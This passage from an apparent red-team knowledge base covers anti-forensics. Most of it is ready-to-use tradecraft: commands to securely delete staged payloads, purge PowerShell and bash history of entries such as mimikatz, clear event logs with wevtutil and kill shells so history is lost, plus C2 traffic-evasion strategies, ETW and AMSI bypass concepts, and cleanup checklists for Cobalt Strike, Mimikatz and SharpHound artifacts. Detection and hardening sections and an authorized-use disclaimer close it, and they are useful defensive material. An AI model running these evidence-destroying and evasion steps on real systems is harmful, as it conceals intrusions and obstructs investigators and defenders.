# Or remove the host file entirely

# === Detection ===
# dir /R shows alternate streams
# Sysmon Event ID 15 (FileCreateStreamHash) logs ADS creation
# Get-Item -Stream * enumerates all streams
# ForensicTools: FTK, Autopsy detect ADS
```

#### Secure File Deletion

```powershell
# === SDelete (Sysinternals) ===
sdelete -p 3 C:\Windows\Temp\payload.exe    # 3-pass overwrite
sdelete -r -p 3 C:\Windows\Temp\tools\      # Recursive directory
sdelete -c C:                                 # Clean free space on volume
sdelete -z C:                                 # Zero free space

# === cipher (built-in Windows) ===
# Overwrite deleted data on a volume
cipher /w:C:\Windows\Temp

# === PowerShell secure delete (overwrite then delete) ===
$path = "C:\Windows\Temp\payload.exe"
$size = (Get-Item $path).Length
$random = New-Object byte[] $size
(New-Object Random).NextBytes($random)
[System.IO.File]::WriteAllBytes($path, $random)  # Overwrite with random
[System.IO.File]::WriteAllBytes($path, (New-Object byte[] $size))  # Overwrite with zeros
Remove-Item $path -Force

# === Linux secure deletion ===
shred -vfz -n 3 /tmp/payload          # 3 random passes + 1 zero pass
srm -sz /tmp/payload                    # Secure remove

# NOTE on SSD/NVMe:
# Secure deletion is unreliable on SSDs due to wear leveling
# The SSD controller may map the overwrite to different flash cells
# TRIM operations mark blocks as unused but don't guarantee zeroing
# For SSDs, full-disk encryption is the most reliable approach
```

#### NTFS Transaction Rollback ($TxfLog)

```
NTFS Transactional (TxF) allows file operations within transactions.
Abuse scenario:
1. Start a transaction
2. Write malicious content to a file within the transaction
3. The file appears modified (and can be executed)
4. Roll back the transaction
5. NTFS reverts the file to its pre-transaction state
6. Forensic analysis of the file shows the original (clean) content

Note: TxF is deprecated since Windows 8 but the API still functions.
Some malware (e.g., process doppelganging) leverages TxF to avoid detection.

Transacted file operations leave traces in:
- $TxfLog (NTFS transaction log)
- Kernel Transaction Manager (KTM) logs
```

---

### 7. Command History Cleanup

#### PowerShell History

```powershell
# === Clear in-memory history ===
Clear-History

# === PSReadLine ConsoleHost_history.txt ===
# Location: %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
# This file records ALL PowerShell commands persistently

# View current history file location
(Get-PSReadLineOption).HistorySavePath

# Delete the history file
Remove-Item (Get-PSReadLineOption).HistorySavePath -Force

# Edit to remove specific entries
$histPath = (Get-PSReadLineOption).HistorySavePath
$history = Get-Content $histPath | Where-Object { $_ -notmatch "mimikatz|Invoke-|payload|chisel" }
$history | Set-Content $histPath

# === Disable PSReadLine history for current session ===
Set-PSReadLineOption -HistorySaveStyle SaveNothing

# === Disable PSReadLine history permanently ===
# Add to PowerShell profile:
# Set-PSReadLineOption -HistorySaveStyle SaveNothing

# === PowerShell Script Block Logging cleanup ===
# Script Block logs: Microsoft-Windows-PowerShell/Operational
# Event ID 4104: Script Block Logging
wevtutil cl "Microsoft-Windows-PowerShell/Operational"

# Or selective deletion (see Event Log Manipulation section)

# === PowerShell Transcription cleanup ===
# If transcription is enabled, transcripts are saved to:
# Default: $env:USERPROFILE\Documents\PowerShell_transcript*.txt
# Or custom path defined in Group Policy
Get-ChildItem "$env:USERPROFILE\Documents\PowerShell_transcript*" | Remove-Item -Force

# Check Group Policy path:
# Computer Configuration > Admin Templates > Windows Components >
# Windows PowerShell > Turn on PowerShell Transcription
```

#### Linux Command History

```bash
# === Clear current session history ===
history -c            # Clear in-memory history
history -w            # Write (empty) history to file

# === Prevent history recording (set at session start) ===
unset HISTFILE                    # No history file
export HISTFILE=/dev/null         # History goes to /dev/null
export HISTSIZE=0                 # Zero history buffer
export HISTFILESIZE=0             # Zero history file size
export HISTCONTROL=ignoreboth     # Ignore duplicates and space-prefixed commands

# === Space prefix trick ===
# Commands prefixed with a space are not recorded (if HISTCONTROL includes ignorespace)
export HISTCONTROL=ignorespace
 whoami                           # Note the leading space -- not recorded

# === Delete specific history entries ===
history -d <line_number>          # Delete specific entry by number

# === Clear bash history file ===
cat /dev/null > ~/.bash_history
# Or: truncate -s 0 ~/.bash_history

# === For zsh ===
cat /dev/null > ~/.zsh_history
# Or in session: fc -p /dev/null

# === Kill the shell without saving history ===
kill -9 $$                        # Kill current shell process
# History is written on clean exit; kill -9 prevents this

# === Disable history in /etc/profile or ~/.bashrc ===
# Add: unset HISTFILE
# Or: HISTSIZE=0
```

---

### 8. Network Forensics Evasion

#### Encrypted C2 Communication

```
Strategies to evade network forensics (PCAP analysis, NetFlow, IDS/IPS):

1. TLS-encrypted C2:
   - Use legitimate TLS certificates (Let's Encrypt)
   - Match JA3/JA4 fingerprints to common browsers
   - Use standard cipher suites (not custom/unusual ones)
   - Piggyback on legitimate domains (domain fronting where possible)

2. Protocol mimicry:
   - Shape C2 traffic to look like legitimate protocols
   - Match expected packet sizes, timing, and content types
   - Tools: Malleable C2 profiles (Cobalt Strike), traffic profiles

3. DNS over HTTPS (DoH):
   - Encapsulate DNS C2 within HTTPS to legitimate DoH resolvers
   - Traffic appears as standard HTTPS to Cloudflare/Google

4. Legitimate service abuse:
   - Use legitimate cloud APIs (Slack, Discord, Telegram, OneDrive)
   - Traffic to these services is expected and rarely blocked
   - C2 data embedded in API calls
```

#### Timestamp Padding and Traffic Shaping

```
1. Jitter:
   - Add random delays to beacon intervals
   - Prevents detection of regular beaconing patterns
   - Typical: 10-50% jitter on 60-300 second intervals

2. Working hours operation:
   - Limit C2 activity to business hours
   - Reduces anomaly detection from after-hours traffic
   - Match the target organization's time zone

3. Packet size normalization:
   - Ensure C2 packets match expected sizes for the mimicked protocol
   - Pad small packets, chunk large transfers
   - Avoid unusually large or small packets

4. Connection pooling:
   - Reuse existing connections rather than creating new ones
   - Reduces connection metadata in NetFlow
   - Mimics persistent connections (HTTP/2, WebSocket)
```

---

### 9. Cleanup Checklists

#### Cobalt Strike Artifacts

```
Files/Artifacts to Clean:
[ ] Beacon DLL/shellcode (wherever staged)
[ ] Service binaries (if persistence via service)
[ ] Named pipes: \.\pipe\msagent_*, \.\pipe\MSSE-*-server, \.\pipe\postex_*
[ ] Malleable C2 profile artifacts (spawned processes)
[ ] Screenshots saved to disk
[ ] Keylog files
[ ] Jump/remote-exec artifacts (PSExec service, WMI objects)
[ ] SMB beacon named pipes on target hosts

Registry:
[ ] Service entries (if service persistence used)
[ ] Run/RunOnce keys (if registry persistence)

Event Logs:
[ ] Security: 4624 (logon), 4688 (process creation)
[ ] System: 7045 (service installed)
[ ] PowerShell: 4104 (script block), 4103 (module logging)
[ ] Sysmon: 1 (process create), 3 (network), 7 (image loaded), 17/18 (pipe)
```

#### Mimikatz Artifacts

```
Files/Artifacts to Clean:
[ ] mimikatz.exe or renamed binary
[ ] Prefetch: MIMIKATZ.EXE-*.pf (or renamed binary prefetch)
[ ] Memory dumps (lsass.dmp, minidump files)

Event Logs:
[ ] Security: 4624 type 9 (NewCredentials from PTH)
[ ] Security: 4672 (special privileges for impersonated tokens)
[ ] Sysmon: 10 (process access to lsass.exe)
[ ] Sysmon: 7 (suspicious DLL loads)

Registry:
[ ] AmCache entry with SHA1 hash
[ ] ShimCache entry (persists on reboot)
[ ] BAM entry with execution timestamp
```

#### BloodHound/SharpHound Artifacts

```
Files/Artifacts to Clean:
[ ] SharpHound.exe or SharpHound.ps1
[ ] Collection ZIP file (YYYYMMDDHHMMSS_BloodHound.zip)
[ ] Individual JSON files (computers.json, users.json, etc.)
[ ] Prefetch: SHARPHOUND.EXE-*.pf

Event Logs:
[ ] Security: 4688 (SharpHound process creation)
[ ] LDAP query logs (if LDAP audit logging is enabled)
[ ] Sysmon: 3 (network connections to DCs on ports 389/636)
[ ] High volume of SMB connections (session enumeration)

Network:
[ ] LDAP query burst from non-DC source
[ ] SMB session enumeration patterns
[ ] DNS PTR record bulk queries
```

#### General Post-Operation Cleanup Procedure

```
Phase 1: Pre-Cleanup Assessment
[ ] Review all hosts accessed during the operation
[ ] Inventory all tools deployed (binaries, scripts, web shells)
[ ] List all persistence mechanisms installed
[ ] Note all tunnels and pivot connections established
[ ] Check which artifacts have already been sent to SIEM/EDR cloud

Phase 2: Persistence Removal
[ ] Remove scheduled tasks (schtasks /delete)
[ ] Remove services (sc delete)
[ ] Clean registry run keys
[ ] Remove WMI subscriptions
[ ] Delete web shells
[ ] Remove SSH keys added to authorized_keys
[ ] Revert modified startup scripts

Phase 3: Tool Cleanup
[ ] Delete all uploaded binaries
[ ] Remove renamed/disguised tools
[ ] Clean Prefetch entries for tools
[ ] Delete any output files (scan results, dumps, screenshots)
[ ] Remove temporary directories created

Phase 4: Log Cleanup (coordinate with client)
[ ] Clean relevant event log entries
[ ] Clean command history (PowerShell, bash)
[ ] Clean web server access logs (if web shells used)
[ ] Clean authentication logs

Phase 5: Artifact Verification
[ ] Verify Prefetch cleanup
[ ] Check AmCache for remaining entries
[ ] Verify ShimCache (note: requires reboot to persist)
[ ] Check SRUM for network usage records
[ ] Review BAM/DAM for execution records
[ ] Verify Jump Lists and Recent Items cleaned
[ ] Check for LNK file remnants

Phase 6: Tunnel Teardown
[ ] Terminate all active tunnels and SOCKS proxies
[ ] Remove tunnel agent binaries
[ ] Verify no listening ports remain
[ ] Remove any TUN/TAP interfaces created
[ ] Clean up any DNS records created for tunneling
```

#### Pre-Engagement Baseline Methodology

```
Before beginning an operation, establish an artifact baseline:

1. Snapshot key artifact stores:
   - List existing Prefetch files: dir C:\Windows\Prefetch\*.pf
   - Export ShimCache: AppCompatCacheParser --csv baseline\
   - Export AmCache: copy C:\Windows\appcompat\Programs\Amcache.hve baseline\
   - Export BAM entries: reg export "HKLM\SYSTEM\...\bam" baseline\bam.reg
   - List running services: sc query state= all > baseline\services.txt
   - List scheduled tasks: schtasks /query /fo csv > baseline\tasks.csv

2. Document the baseline state:
   - This allows precise identification of operator-generated artifacts
   - Diff post-operation state against baseline for thorough cleanup
   - Share baseline with client for post-engagement verification
```

---

## 2025 Techniques

### EDR Telemetry and Cloud-First Logging

The 2025 threat landscape has fundamentally shifted the anti-forensics challenge. Modern EDR solutions (CrowdStrike Falcon, Microsoft Defender for Endpoint, SentinelOne) stream telemetry to cloud backends in near real-time. This means that by the time an operator attempts to clean local logs, the events have already been transmitted. Key implications for red teams:

- **Local log cleanup is necessary but insufficient**: Always assume that EDR telemetry has been forwarded before you can clean local artifacts. The value of local cleanup is primarily for post-engagement report tidiness and delaying incident response, not preventing detection entirely.
- **ETW patching is increasingly critical**: Patching ETW at the process level (ntdll!EtwEventWrite) prevents the current process from generating telemetry that EDR agents consume. This must be done early in the kill chain, before suspicious actions begin.
- **Userland unhooking**: EDR agents typically hook ntdll.dll functions. Refreshing ntdll from disk or using direct syscalls bypasses these hooks, preventing the EDR from observing API calls. This is complementary to ETW patching.

### AI-Assisted Forensic Detection (2025)

Forensic tools in 2025 increasingly incorporate machine learning for anomaly detection:

- **Timeline anomaly detection**: ML models trained on normal timestamp distributions can flag timestomped files even when $SI/$FN comparison is inconclusive.
- **Log gap detection**: AI systems analyze log continuity and can detect periods where logging was suspended (Phant0m-style attacks) based on expected event generation rates.
- **Behavioral clustering**: Even encrypted C2 traffic can be identified through behavioral analysis of connection patterns, timing, and volume without decrypting the content.

### Sleep Obfuscation Evolution

Sleep obfuscation has continued to evolve in 2025 with several new techniques:

- **Cronos** (by Idov31): Uses waitable timers, providing a different detection surface than Ekko's timer queues. Waitable timers are less commonly monitored than timer queue timers.
- **Hypnus**: A Rust-based implementation offering memory obfuscation with stronger memory safety guarantees and cross-platform potential.
- **Stack encryption**: Beyond encrypting the heap-allocated payload, newer techniques also encrypt the thread's stack during sleep to prevent stack-based detection (call stack analysis).
- **Hardware breakpoint triggers**: Some implementations use hardware breakpoints to trigger the decryption/encryption cycle rather than timer callbacks, reducing the number of suspicious API calls.

### AMSI and ETW Bypass Consolidation

In 2025, red team tooling has consolidated around reliable AMSI and ETW bypass patterns:

```powershell
# AMSI bypass concept (patches AmsiScanBuffer)
# The actual implementation varies as signatures are constantly updated
# Key is to patch the function early, before loading any suspicious scripts

# ETW bypass concept (patches EtwEventWrite)
# Prevents the current process from emitting ETW events
# Must be applied before performing any logged actions
# Some EDR products detect the patch itself via periodic integrity checks
```

### Forensic Tool Awareness

Modern red team operators need awareness of common forensic tools to understand what artifacts they should focus on:

- **KAPE (Kroll Artifact Parser and Extractor)**: Automated collection of forensic artifacts. Understanding KAPE targets reveals which artifacts are considered important.
- **Velociraptor**: Open-source endpoint monitoring and forensics. Its artifact definitions catalog shows what defenders look for.
- **Eric Zimmerman tools**: The gold standard for Windows forensic artifact analysis (MFTECmd, PECmd, AppCompatCacheParser, AmcacheParser, SrumECmd, ShellBagsExplorer). Understanding these tools' capabilities informs cleanup priorities.

---

## Detection & Defense

### Detection Strategies for Anti-Forensics Activity

```
Log Sources:
- Sysmon (critical for anti-forensics detection):
  - Event ID 2: FileCreateTime changed (timestomping)
  - Event ID 11: FileCreate (tool deployment)
  - Event ID 23: FileDelete (archived, if configured)
  - Event ID 26: FileDeleteDetected
- Windows Security Event Log:
  - Event ID 1102: Audit log cleared (Security)
  - Event ID 104: System log cleared
  - Event ID 4688: Process creation (with command line)
  - Event ID 4697: Service installation
- PowerShell:
  - Event ID 4104: Script Block Logging
  - Event ID 4103: Module Logging
- EDR telemetry (streamed to cloud SIEM)

Detection Indicators:
- Mass file deletion in Prefetch directory
- Registry key deletion for ShimCache/AmCache/BAM
- EventLog service thread termination
- Time gaps in event logs (missing expected events)
- $SI timestamp earlier than $FN timestamp (timestomping)
- vssadmin/wmic/diskshadow commands for shadow deletion
- PowerShell history file deletion or truncation
- Log file truncation (sudden size reduction)
- ETW provider being disabled or patched
- Audit configuration changes (auditctl -D)
```

### Hardening Measures

```
- Enable and protect Sysmon with a comprehensive configuration
  - Log file timestamp changes (Event ID 2)
  - Log file deletions (Event ID 23/26)
  - Use Sysmon driver altitude to resist tampering
- Forward all logs to a central SIEM in real-time
  - Local log cleanup becomes less effective
  - Ensure log forwarding is resilient (Windows Event Forwarding/WEF)
- Enable Volume Shadow Copy with protected storage
  - Use controlled access to prevent unauthorized deletion
  - Monitor for vssadmin and wmic shadowcopy commands
- Implement PowerShell Constrained Language Mode
  - Prevents many PowerShell-based cleanup techniques
- Enable Script Block Logging and Module Logging
  - Even if local logs are cleared, forwarded logs persist
- Deploy file integrity monitoring (FIM) on critical directories
  - C:\Windows\Prefetch\
  - C:\Windows\System32\winevt\Logs\
  - C:\Windows\appcompat\Programs\
  - /var/log/ directories
- Use tamper-proof EDR configurations
  - Anti-tamper features that prevent agent disabling
  - Cloud-verified agent health checks
- Enable Protected Event Logging (Windows 10+)
  - Encrypts sensitive log content (CMS encryption)
  - Prevents reading of security logs by compromised accounts
- Implement audit policy immutability
  - auditctl -e 2 (Linux: makes audit rules immutable until reboot)
  - Windows: Protected Users group, Credential Guard
```

---

## OPSEC Considerations

1. **Artifact Minimization Over Cleanup**: The most effective anti-forensics strategy is to generate fewer artifacts in the first place. Use in-memory execution, fileless techniques, and living-off-the-land binaries (LOLBins) to reduce the artifact footprint.

2. **Cleanup Timing**: Clean artifacts as close to operation end as possible. Premature cleanup can itself generate alerts and tip off defenders. However, leaving artifacts too long risks automated detection.

3. **Cleanup Artifacts**: The act of cleanup generates its own artifacts. Deleting files creates $MFT change records and $UsnJrnl entries. Clearing event logs creates Event ID 1102. Be aware that cleanup is visible.

4. **EDR Telemetry Lag**: Understand the latency between local event generation and cloud SIEM ingestion. In some environments this is seconds; in others, minutes. Cleanup must account for what has already been transmitted.

5. **Selective vs. Wholesale Cleanup**: Selectively removing specific entries is less detectable than clearing entire logs. An empty Security event log is a glaring red flag. A log with specific events surgically removed is much harder to detect.

6. **Volume Shadow Copies**: Always check for and handle Volume Shadow Copies. They can contain snapshots of the filesystem from before your cleanup, effectively undoing all disk-level anti-forensics.

7. **ShimCache Timing**: Remember that ShimCache entries are only persisted to the registry on shutdown/reboot. If you can clean the registry before the system restarts, those entries never persist. However, memory forensics can still recover them from a running system.

8. **Multiple Evidence Sources**: Modern forensics correlates dozens of artifact sources. Cleaning only Prefetch but leaving AmCache, SRUM, and BAM creates an inconsistency that is itself suspicious and detectable.

9. **Client Coordination**: In legitimate red team engagements, coordinate cleanup with the client's blue team. Document all artifacts created and cleaned. The blue team may want to preserve some artifacts for training purposes.

10. **Legal and Ethical Boundaries**: Anti-forensics techniques are documented here for authorized red team operations and defensive research. Unauthorized evidence tampering is a criminal offense in most jurisdictions. Always operate within the scope of your engagement agreement.

---

## Cross-References

- [../09-lateral-movement/network-pivoting.md](../09-lateral-movement/network-pivoting.md) -- Cleaning up pivot artifacts and tunneling traces
- [../03-execution/README.md](../03-execution/README.md) -- Execution techniques that generate forensic artifacts
- [../04-persistence/README.md](../04-persistence/README.md) -- Persistence mechanisms to remove during cleanup
- [../05-privilege-escalation/README.md](../05-privilege-escalation/README.md) -- Privilege escalation artifacts
- [../07-credential-access/README.md](../07-credential-access/README.md) -- Credential tool artifacts (Mimikatz, Rubeus)
- [../11-command-and-control/README.md](../11-command-and-control/README.md) -- C2 network forensics evasion
- [../15-code-examples/README.md](../15-code-examples/README.md) -- Implementation examples for anti-forensics tools

---

## References

- MITRE ATT&CK T1070 - Indicator Removal: https://attack.mitre.org/techniques/T1070/
- MITRE ATT&CK T1070.001 - Clear Windows Event Logs: https://attack.mitre.org/techniques/T1070/001/
- MITRE ATT&CK T1070.003 - Clear Command History: https://attack.mitre.org/techniques/T1070/003/
- MITRE ATT&CK T1070.004 - File Deletion: https://attack.mitre.org/techniques/T1070/004/
- MITRE ATT&CK T1070.006 - Timestomp: https://attack.mitre.org/techniques/T1070/006/
- Hack The Box - Anti-Forensics Techniques: https://www.hackthebox.com/blog/anti-forensics-techniques
- Kroll - Anti-Forensic Tactics Timestomping: https://www.kroll.com/en/publications/cyber/anti-forensic-tactics
- HackTricks - Anti-Forensic Techniques: https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/anti-forensic-techniques
- Red Team Notes - Timestomping: https://www.ired.team/offensive-security/defense-evasion/t1099-timestomping
- Andrea Fortuna - USN Journal Forensics (2025): https://andreafortuna.org/2025/09/06/usn-journal
- Anti-Forensics.com - Timestomping: https://anti-forensics.com/blog/timestomping/
- Invoke-Phant0m GitHub: https://github.com/hlldz/Phant0m
- Red Team Notes - Disabling Event Logs: https://www.ired.team/offensive-security/defense-evasion/disabling-windows-event-logs-by-suspending-eventlog-service-threads
- Event Log Tampering Part 1 (svch0st): https://svch0st.medium.com/event-log-tampering-part-1-disrupting-the-eventlog-service-8d4b7d67335c
- Event Log Tampering Part 2 (svch0st): https://svch0st.medium.com/event-log-tampering-part-2-manipulating-individual-event-logs-3de37f7e3a85
- Fox-IT - DanderSpritz Detection and Recovery: https://blog.fox-it.com/2017/12/08/detection-and-recovery-of-nsas-covered-up-tracks/
- Eventlogedit-evtx--Evolution (3gstudent): https://github.com/3gstudent/Eventlogedit-evtx--Evolution
- Ekko Sleep Obfuscation GitHub: https://github.com/Cracked5pider/Ekko
- Cronos Sleep Obfuscation GitHub: https://github.com/Idov31/Cronos
- Hypnus Memory Obfuscation (Rust): https://github.com/joaoviictorti/hypnus
- Binary Defense - Understanding Sleep Obfuscation: https://binarydefense.com/resources/blog/understanding-sleep-obfuscation
- WithSecure - Hunting for Timer-Queue Timers: https://labs.withsecure.com/publications/hunting-for-timer-queue-timers
- Kyle Avery - Avoiding Memory Scanners: https://kyleavery.com/posts/avoiding-memory-scanners/
- Fortinet - Shadow Copy Deletion Methods: https://www.fortinet.com/blog/threat-research/stomping-shadow-copies-a-second-look-into-deletion-methods
- Picus Security - Underrated VSC Deletion Technique: https://www.picussecurity.com/resource/blog/technique-to-delete-volume-shadow-copies-deviceiocontrol
- MITRE CAR-2021-01-009 - Shadow Copy Deletion/Resize: https://car.mitre.org/analytics/CAR-2021-01-009/
- Magnet Forensics - ShimCache vs AmCache: https://www.magnetforensics.com/blog/shimcache-vs-amcache-key-windows-forensic-artifacts/
- Windows Forensic Analysis (2026): https://thelinuxcode.com/windows-forensic-analysis-a-practitioners-workflow-for-artifacts-timelines-and-open-source-tools-2026/
- Windows Forensic Artifacts Handbook: https://github.com/Psmths/windows-forensic-artifacts
- 30 Days of Red Team - OPSEC and Anti-Forensics: https://medium.com/30-days-of-red-team/30-days-of-red-team-day-13-operational-security-anti-forensics-728df45a09e6
